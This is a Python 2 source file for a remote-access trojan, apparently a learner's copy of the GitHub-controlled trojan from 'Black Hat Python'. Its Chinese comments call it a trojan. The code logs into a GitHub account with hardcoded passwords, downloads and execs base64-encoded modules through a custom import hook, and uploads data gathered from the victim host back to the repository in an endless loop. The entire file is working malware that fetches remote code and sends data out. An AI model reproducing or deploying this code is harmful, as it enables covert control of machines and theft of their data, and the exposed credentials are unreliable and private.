#coding:utf-8
import json
import base64
import sys
import time 
import imp 
import random
import threading
import Queue
import os 

from github3 import login

trojan_id = 'abc'

trojan_config = '%s.json' % trojan_id
data_path = 'data/%s/' % trojan_id
trojan_modules = []
configured = False 
task_queue = Queue.Queue()

#连接github
def connect_to_github():
	try:

		gh = login(username='tongzhichao',password='2')
		repo = gh.repository('tongzhichao','chapter7')
		branch = repo.branch('master')

		return gh,repo,branch
	except:
		time.sleep(10)
		gh = login(username='tongzhichao',password='tongzhifu12')
		repo = gh.repository('tongzhichao','chapter7')
		branch = repo.branch('master')
		return gh,repo,branch
#从远程仓库获取文件内容
def get_file_contents(filepath):
	gh,repo,branch = connect_to_github()
#	tree = branch.commit.commit.tree.recurse()
	tree = branch.commit.commit.tree.to_tree().recurse()
	for filename in tree.tree:
		if filepath in filename.path:
			print('[*] Found file %s ' % filepath)
			blob  = repo.blob(filename._json_data['sha'])
			return blob.content
	return None


# 获取木马的配置文件，并导入模块
def get_trojan_config():
	global configured
	config_json = get_file_contents(trojan_config)
	config = json.loads(base64.b64decode(config_json))
	print('from github get config: ', config)
	configured = True

	for task in config:
		if task['module'] not in sys.modules:
			print('will import module',task['module'])
			exec('import %s ' % task['module'])
	return config

# 将从目标主机收集到的数据推送到仓库中
def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path = 'data/%s/%d.data' % (trojan_id,random.randint(10,10000000))
	repo.create_file(remote_path,'commit message',base64.b64encode(data))

	return 


def module_runner(module):
	task_queue.put(1)
#---1---
	result = sys.modules[module].run()

	task_queue.get()
#----2---	
	store_module_result(result)
	return

class GitImporter(object):
	def __init__(self):
		self.current_module_code=""
	def find_module(self,fullname,path=None):
		print('will into findmodule')
		if configured:
			print('[*] Attempting to retrieve %s '% fullname)
#----1-----
			new_library = get_file_contents('modules/%s' % fullname)
			
			if new_library is not None:
#----2-----
				self.current_module_code = base64.b64decode(new_library)
				return self
		return None

	def load_module(self,name):

		print('will into loadmodule',name)
		
#----3----
		module = imp.new_module(name)
#-----4---		
		exec self.current_module_code in module.__dict__
#-----5----
		sys.modules[name] = module

		return module

#---3---	
sys.meta_path = [GitImporter()]
while True:
	if task_queue.empty():
#----4---
		config = get_trojan_config()
		for task in config:
#-----5---
			t = threading.Thread(target=module_runner,args=(task['module'],))
			t.start()
			time.sleep(random.randint(1,10))

	time.sleep(random.randint(1000,10000))
